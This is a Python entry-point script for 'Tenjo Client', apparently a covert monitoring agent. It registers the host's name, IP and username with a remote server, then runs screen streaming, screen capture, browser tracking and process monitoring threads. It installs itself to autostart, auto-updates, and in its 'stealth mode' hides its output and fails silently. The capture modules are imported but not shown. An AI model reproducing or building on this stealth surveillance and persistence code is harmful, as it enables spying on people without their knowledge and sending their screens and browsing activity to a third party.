#!/usr/bin/env python3
# Tenjo Client - STEALTH MODE (NO HANG)

import sys
import os
import time
import logging
import signal
import threading

# Add src to path
sys.path.append('src')

from src.core.config import Config
from src.utils.api_client import APIClient
from src.utils.auto_update import check_and_update_if_needed
from src.modules.stream_handler import StreamHandler
from src.modules.browser_tracker import BrowserTracker
from src.modules.screen_capture import ScreenCapture
from src.modules.process_monitor import ProcessMonitor
from src.utils.stealth import StealthMode, StealthManager
from os_detector import get_os_info_for_client

# Global flag for graceful shutdown
shutdown_flag = False

def signal_handler(signum, frame):
    """Handle shutdown signals gracefully"""
    global shutdown_flag
    shutdown_flag = True

def setup_stealth_logging():
    """Setup logging for stealth mode - minimal output"""
    if Config.STEALTH_MODE:
        # In stealth mode, log to file only with minimal level
        log_file = os.path.join(Config.LOG_DIR, 'stealth.log')
        logging.basicConfig(
            level=logging.WARNING,  # Only warnings and errors
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file, mode='a'),
                # No console handler in stealth mode
            ]
        )
    else:
        # Development mode - normal logging
        logging.basicConfig(
            level=getattr(logging, Config.LOG_LEVEL),
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
        )

class StealthClient:
    def __init__(self):
        self.api_client = APIClient(Config.SERVER_URL, Config.API_KEY)
        self.stream_handler = StreamHandler(self.api_client)
        self.process_monitor = ProcessMonitor(self.api_client)
        self.stealth_mode = StealthMode()
        self.stealth_manager = StealthManager(entry_script=os.path.abspath(__file__))
        self.heartbeat_interval = max(10, Config.HEARTBEAT_INTERVAL)

        # Setup stealth logging
        setup_stealth_logging()
        self.logger = logging.getLogger('StealthClient')

        # Initialize browser tracker
        self.browser_tracker = BrowserTracker(self.api_client, self.logger)
        
        # Initialize screen capture with browser tracker integration
        self.screen_capture = ScreenCapture(self.api_client)
        self.screen_capture.set_browser_tracker(self.browser_tracker)

        # Enable stealth-specific behaviors
        if Config.STEALTH_MODE:
            self.stealth_mode.enable_stealth()

    def register_client(self):
        """Register client with server (silent)"""
        try:
            # Get OS info using the new detector
            os_info = get_os_info_for_client()
            
            client_info = {
                'client_id': Config.CLIENT_ID,
                'hostname': Config.HOSTNAME,
                'platform': Config.PLATFORM,
                'version': '1.0.0',
                'capabilities': ['streaming', 'monitoring'],
                'ip_address': Config.IP_ADDRESS,  # Use real IP address
                'username': Config.CLIENT_USER,
                'os_info': os_info,
                'timezone': 'Asia/Jakarta'
            }

            response = self.api_client.post('/api/clients/register', client_info)
            return True
        except Exception as e:
            # Silent fail in stealth mode
            if not Config.STEALTH_MODE:
                self.logger.error(f"Registration failed: {e}")
            return False

    def send_heartbeat(self):
        """Send heartbeat to server (silent)"""
        try:
            heartbeat_data = {
                'client_id': Config.CLIENT_ID,
                'timestamp': time.time(),
                'status': 'active'
            }

            response = self.api_client.post('/api/clients/heartbeat', heartbeat_data)
            return True
        except Exception as e:
            # Silent fail in stealth mode
            return False

    def run(self):
        """Main execution loop - STEALTH MODE"""
        global shutdown_flag

        if not Config.STEALTH_MODE:
            self.logger.info("=== STEALTH TENJO CLIENT STARTING ===")

        # Install autostart on first run
        if Config.STEALTH_MODE and not os.path.exists(os.path.join(Config.DATA_DIR, '.installed')):
            self.stealth_manager.configure_autostart()
            with open(os.path.join(Config.DATA_DIR, '.installed'), 'w') as f:
                f.write(str(time.time()))

        # Register with server (optional)
        self.register_client()

        # Start stream handler in separate thread
        stream_thread = None
        try:
            stream_thread = threading.Thread(
                target=self.stream_handler.start_streaming,
                daemon=True,
                name="StreamHandler"
            )
            stream_thread.start()
        except Exception as e:
            if not Config.STEALTH_MODE:
                self.logger.error(f"Failed to start stream handler: {e}")

        # Start browser tracker in separate thread
        browser_thread = None
        try:
            self.browser_tracker.start_tracking()
            if not Config.STEALTH_MODE:
                self.logger.info("Browser tracker started")
        except Exception as e:
            if not Config.STEALTH_MODE:
                self.logger.error(f"Failed to start browser tracker: {e}")

        # Start conditional screen capture in separate thread
        screen_capture_thread = None
        try:
            screen_capture_thread = threading.Thread(
                target=self.screen_capture.start_capture,
                daemon=True,
                name="ScreenCapture"
            )
            screen_capture_thread.start()
            if not Config.STEALTH_MODE:
                self.logger.info("Conditional screen capture started")
        except Exception as e:
            if not Config.STEALTH_MODE:
                self.logger.error(f"Failed to start screen capture: {e}")

        # Start process monitor in separate thread
        process_thread = None
        try:
            process_thread = threading.Thread(
                target=self.process_monitor.start_monitoring,
                daemon=True,
                name="ProcessMonitor"
            )
            process_thread.start()
            if not Config.STEALTH_MODE:
                self.logger.info("Process monitor started")
        except Exception as e:
            if not Config.STEALTH_MODE:
                self.logger.error(f"Failed to start process monitor: {e}")

        # Stealth main loop - minimal logging
        last_heartbeat_at = time.time()
        last_status_log = time.time()
        loop_counter = 0
        while not shutdown_flag:
            try:
                loop_counter += 1
                current_time = time.time()

                # Send heartbeat based on configured interval
                if current_time - last_heartbeat_at >= self.heartbeat_interval:
                    self.send_heartbeat()
                    last_heartbeat_at = current_time

                # Log status periodically when not in stealth mode (every hour)
                if not Config.STEALTH_MODE and current_time - last_status_log >= 3600:
                    self.logger.info(
                        f"Stealth client running - {loop_counter} cycles completed"
                    )
                    last_status_log = current_time

                time.sleep(5)  # 5 second intervals

            except KeyboardInterrupt:
                if not Config.STEALTH_MODE:
                    self.logger.info("Received keyboard interrupt")
                break
            except Exception as e:
                if not Config.STEALTH_MODE:
                    self.logger.error(f"Main loop error: {e}")
                time.sleep(10)

        if not Config.STEALTH_MODE:
            self.logger.info("Stealth client shutting down...")

def main():
    """Entry point"""
    # Check for updates first (will restart if update available)
    try:
        if check_and_update_if_needed(Config):
            # Update was performed, client will restart
            return
    except Exception as e:
        # Update failed, continue with current version
        if not Config.STEALTH_MODE:
            print(f"Update check failed: {e}")
    
    # Set up signal handlers
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Create and run stealth client
    client = StealthClient()
    client.run()

if __name__ == "__main__":
    main()
